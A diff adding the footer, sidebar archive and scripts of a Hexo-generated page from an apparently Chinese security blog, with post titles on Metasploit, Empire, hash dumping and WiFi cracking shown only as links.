+                <a href="mailto:my@marksec.org" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//https://github.com/markhacker" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/weixin.jpg">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 5
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/lotus模块修改/">关于metasploit模块lotus版本大于9.0的修改</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href="/2018/12/06/Empire学习指南/">Empire学习指南</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href="/2018/07/06/Metasploit使用小结/">Metasploit常用模块总结</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href="/2017/12/19/内网渗透之抓hash/">内网渗透之hash抓取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span><a class="archive-post-title" href="/2017/02/16/无线WiFi破解/">无线wifi破解</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="empire"><span class="iconfont-archer">&#xe606;</span>empire</span>
+    
+        <span class="sidebar-tag-name" data-tags="powershell"><span class="iconfont-archer">&#xe606;</span>powershell</span>
+    
+        <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web安全"><span class="iconfont-archer">&#xe606;</span>Web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="无线安全"><span class="iconfont-archer">&#xe606;</span>无线安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "mark"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
